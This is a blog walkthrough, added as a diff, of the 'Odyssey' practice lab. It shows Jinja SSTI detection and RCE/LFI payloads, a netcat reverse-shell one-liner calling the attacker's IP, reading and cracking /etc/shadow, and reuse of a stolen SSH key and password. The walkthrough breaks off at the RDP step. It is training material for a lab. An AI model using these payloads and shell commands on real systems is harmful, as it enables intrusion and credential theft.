@@ -1,0 +1,263 @@
+---
+title: "HackSmarter Odyssey Walkthrough  "
+date: 2026-06-09 00:00:00 +0000
+categories: [ HackSmarterlabs]
+tags: [Hacksmarterlabs , Active Directory]
+---
+
+
+## Objective / Scope
+
+You are a member of the Hack Smarter Red Team and have been assigned to perform a black-box penetration test against a client's critical infrastructure. There are three machines in scope: one Linux web server and two Windows enterprise hosts.
+
+The client’s environment is currently in a degraded state due to ongoing migration efforts; the Domain Controllers are experiencing synchronization failures. Consequently, standard automated LDAP enumeration tools (such as BloodHound) are expected to fail or return unreliable data. The client wants to assess if an attacker can thrive in this "broken" environment where standard administrative tools are malfunctioning.
+
+Note From The Author
+Odyssey was built off a recent engagement that I had where the DC's were not syncing correctly. This caused a lot of problems during the engagement. We also had to go through a proxy, which made tools like LDAP very hard to use. Your normal tools may fail... can you think outside the box?
+
+## Solution : 
+
+First we start by scanning all machines : 
+
+<img width="1814" height="790" alt="image" src="https://github.com/user-attachments/assets/ab3c393a-31d2-4391-8066-273340fcc0f1" />
+
+From the open ports , we can tell that we have A DC , a windows machine and a web server . Once the scans were done this is what we could conclude : 
+
+DC-01 : The Domain controller (Obviously) we see port 88 and DNS and ldap so we can confirm as well . 
+
+WKST-01 : A Windows workstation with RDP open on it . 
+
+Web-01 : This is a Linux machine hosting a Web server on port 5000 and an SSH server .
+
+First before we start we need to add the Domain names , Hostnames to our /etc/hosts file , we can use nxc for it . 
+
+<img width="1684" height="567" alt="image" src="https://github.com/user-attachments/assets/6653516f-be36-4f76-bfd6-d792aa0a1d62" />
+
+Now the first thing i always try to do is get a list of usernames that we can use for ASREPROASTING, to do so i like to use nxc to check for Null authentication .
+
+<img width="1069" height="565" alt="image" src="https://github.com/user-attachments/assets/d337aed6-93b7-44b3-85bf-34bcd85985ad" />
+
+Didn't work , tried checking shares as well as the guest account bu that didn't work either . 
+
+<img width="1187" height="784" alt="image" src="https://github.com/user-attachments/assets/ab06c91a-58d2-4a61-a98c-8875efe24971" />
+
+Enumerating RPC and ldap didn't return anything useful either .
+
+<img width="1082" height="332" alt="image" src="https://github.com/user-attachments/assets/69e1a6e6-b751-4de0-b4fb-54f271f3252d" />
+
+Tried checking the shares on the other windows workstation but that didn't work either . The way here is definetly through the Web server . 
+
+### Web-01 !
+
+If we navigate to the web app , we get this Ping function : 
+
+<img width="1071" height="677" alt="image" src="https://github.com/user-attachments/assets/fbbe72a9-4843-4aae-8ac7-b020426052d1" />
+
+Since i saw a Ping , i thought maybe the way is through a command injection , but when i try to enter an IP address it just gets rendered back to us . 
+
+<img width="866" height="475" alt="image" src="https://github.com/user-attachments/assets/5e5c0311-cd8c-4da0-8a43-20f4e1f86acd" />
+
+Whatever we type , we get that Rendered back to us .
+
+<img width="725" height="471" alt="image" src="https://github.com/user-attachments/assets/5b8f7bda-efb5-4086-bba9-0cc0028361ef" />
+
+First thing we should think of is an SSTI injection . I already have a detailed section on my Web metthodology on how to detect and exploit an SSTI : 
+
+```bash
+https://elmehdilaassiri.github.io/posts/web-app-pentesting-methodology/#ssti-
+```
+
+Now to test for it i used this simple payload : {{7*7}} , depending on the response we will know if this web app is actually vulnerable or not , if we get 49 it means our code was actually executed . 
+
+<img width="903" height="461" alt="image" src="https://github.com/user-attachments/assets/2b6c02e3-ecfe-433b-bc2e-25970275433f" />
+
+Perfect our code was executed which means we have an SSTI , now after that we need to know which engine is being used . Again we inject a payload and based on the response rendered to us , we will know which one . 
+
+We can follow this Guide to know which engine is being used . 
+
+```bash
+https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/
+```
+
+<img width="1002" height="519" alt="image" src="https://github.com/user-attachments/assets/7ad9a1f8-92c5-47c9-a3d1-e8976c6f94fe" />
+
+Now we follow this diagram . Injecting {{7*'7'}} : 
+
+<img width="868" height="402" alt="image" src="https://github.com/user-attachments/assets/f8263f71-8952-43c7-bc17-63999310d572" />
+
+This works , so it is either Jinja or Twig . 
+
+I started by injecting a payload for Twig that can cause RCE and i got this error : 
+{% raw %}
+```bash
+# 1/ Information Disclosure :
+{{ _self }}
+
+# 2/ LFI :
+{{ "/etc/passwd"|file_excerpt(1,-1) }}
+
+# 3/ RCE :
+{{ ['id'] | filter('system') }}
+```
+{% endraw %}
+<img width="1083" height="671" alt="image" src="https://github.com/user-attachments/assets/6632c7c7-e545-4ae3-8d09-f30ee81ccc44" />
+
+We clearly see that this is running Jinja . 
+{% raw %}
+```bash
+# 1/ Information Disclosure :
+{{ config.items() }}
+{{ self.__init__.__globals__.__builtins__ }}
+
+# 2/ LFI :
+{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
+
+# 3/ RCE :
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
+{% endraw %}
+Now if we run the payload for RCE : 
+
+<img width="854" height="463" alt="image" src="https://github.com/user-attachments/assets/9cbbd952-d9fa-4d10-b836-6541bc4ad3d5" />
+
+This works perfectly , now all we have to do is turn this into an reverse shell . I first checked if the machine had netcat . 
+
+{% raw %}
+```bash
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('which nc').read() }}
+```
+{% endraw %}
+
+<img width="717" height="430" alt="image" src="https://github.com/user-attachments/assets/ab32f547-3093-44dc-b3c2-606f1a4ad1eb" />
+
+Now we just search for a nc reverse shell . 
+
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.200.62.214 4445 >/tmp/f
+```
+
+<img width="1055" height="525" alt="image" src="https://github.com/user-attachments/assets/28c4bfe0-fee2-498b-9d4c-f369fab6dc86" />
+
+If we execute it , we see that it hangs which is a good sign now if we go back to our listener : 
+
+<img width="840" height="396" alt="image" src="https://github.com/user-attachments/assets/a0bd7161-1638-48f0-9938-13133d4c2c99" />
+
+Perfect now we've got our Foothold . Now first thing i always do is try and stabilize our shell . 
+
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+background 
+stty raw -echo; fg
+export TERM=xterm
+PS1='\[\e[31m\]\u\[\e[96m\]@\[\e[35m\]\H\[\e[0m\]:\[\e[93m\]\w\[\e[0m\]\$'
+```
+
+<img width="1165" height="617" alt="image" src="https://github.com/user-attachments/assets/374e0c66-8554-43a0-ad9d-146571358245" />
+
+Now before i import Linpeas , i like to check some quick wins , i already have a small section inside my OSCP methodology (feel free to check it ) : 
+
+```bash
+id : Check for Groups and Which user . 
+cat /etc/passwd : Check other users on the machine . 
+sudo -l : which prog can be ran with root perm . 
+uname -sr / lsb_relase -a : Version + architecture .  
+find / -type f -perm -04000 -ls 2>/dev/null : Find binaries with SUID . 
+Check for Bash History . 
+If we can Write into a file and execute it as anOTher user , always put a RevShell there .
+If you get Creds always test for password Reuse . 
+cat /etc/fstab : if there is an nfs . 
+sudo -V : check sudo version for privesc . 
+
+# Readable files : (SSH Keys are most important here) :
+find / -readable -type f -group ghill_sa 2>/dev/null
+
+# Kenrel PrivEsc : 
+uname -a : Check the kernel version and check if it has privesc vectors . 
+
+# SUID Binaries : 
+
+We see that there is an added s into who can RWX on that file or executable which makes
+it an SUID , now if we can execute a rev shell with that SUID , it will always give us a
+root shell . There are a lot of legit SUID binaries that we can't exploit but if we find
+an unusual one , we should look into it .  
+
+find / -type f -perm -04000 -ls 2>/dev/null
+
+wget http://10.10.14.139/pspy
+./pspy 
+# Look for UID=0  ===> those are ran by Root . 
+```
+
+<img width="921" height="600" alt="image" src="https://github.com/user-attachments/assets/4f0f49ca-9e27-4c9b-a38c-802e4b359f5c" />
+
+We see that our user can read some SSH files . which shouldn't be allowed , let's import them back to our kali , modify the permissions and try to login using them . 
+
+<img width="1852" height="660" alt="image" src="https://github.com/user-attachments/assets/4d27ec0e-8b10-43cb-8ef8-d6051fac5821" />
+
+Now that we have a private key we can attempt to use it , we don't know this key is for which user . 
+
+<img width="944" height="343" alt="image" src="https://github.com/user-attachments/assets/9d58d320-dc1e-4988-bced-d44d1dc80aa8" />
+
+If we check the users who have a Shell on the machine , we can see the root user , ghill user as well , so let's try to login using the SSH key using  one of these 2 users .
+
+<img width="1049" height="760" alt="image" src="https://github.com/user-attachments/assets/7d758241-8d68-4265-b4e8-6a1c9dc4ab0b" />
+
+Perfect , the Key is for the Root user not ghill , Huge security risk . Now i tried looking for any Kerberos Files on the machine like these 2 : 
+
+/etc/krb5.conf — reveals the realm, KDC address, and confirms AD domain membership
+/etc/krb5.keytab — if readable, contains principal keys that allow direct TGT requests without knowing the password
+
+<img width="744" height="344" alt="image" src="https://github.com/user-attachments/assets/0ef906c6-d8a6-4a26-a705-f7b4bc1a47ac" />
+
+But i couldn't find any of them sadly . 
+
+Now usually Once we fully compromise a Linux machine , it's always good practice to crack the /etc/shadow file , as this might give us some additional passwords we can use for spraying , i got a small section on my OSCP methodology on how to crack the shadows file . 
+
+```bash
+
+# Cracking Shadow file : 
+unshadow pass shadow > unshadow
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadow
+
+# DICTIONARY CRACKING sha512crypt HASHES WITH rockyou.txt
+john --wordlist=rockyou.txt --format=sha512crypt hashes.txt
+
+# DICTIONARY CRACKING MD5 HASHES WITH rockyou.txt
+john --format=Raw-MD5 --wordlist=rockyou.txt hashes.txt
+
+# DICTIONARY CRACKING NTLM HASHES WITH rockyou.txt
+john --format=NT --wordlist=rockyou.txt hashes.txt
+
+```
+
+First we import the shadow and the passwd file : 
+
+<img width="1818" height="790" alt="image" src="https://github.com/user-attachments/assets/eb3a5009-5bd8-4eff-973a-d48b1e22703c" />
+
+Then we crack them and hope we get a password . 
+
+<img width="896" height="594" alt="image" src="https://github.com/user-attachments/assets/d858900c-2762-4c44-acbe-7ea6be56963c" />
+
+We get the root password : "P@ssw0rd!" 
+
+I first tried to check if it is reused by the user ghill to authenticate to the domain, we can use nxc for that : 
+
+<img width="1309" height="657" alt="image" src="https://github.com/user-attachments/assets/23b49ee7-6b11-4610-9c77-7506b65d7c50" />
+
+We see that we can't authenticate to the domain , but the user is a Local user on the Windows workstation . 
+
+
+### EC2AMAZ-NS87CNK :
+
+Now we know that the user ghill is a local user on the machine , let's first check the sares then what type of access our user has , whether he can rdp or winrm . 
+
+<img width="1368" height="576" alt="image" src="https://github.com/user-attachments/assets/0f05cf25-cb90-4ddc-940e-6acf7c94421f" />
+
+Pretty weird , our user has read access over the Admin share and Write over all the other shares , with Write access i tried Uploading a INK file using nxc and use Responder to try and capture some Hashes but that didn't return anything useful . 
+
+Before we check the Shares, let's RDP into the machine to enumerate it further . 
+
+
+
+
+
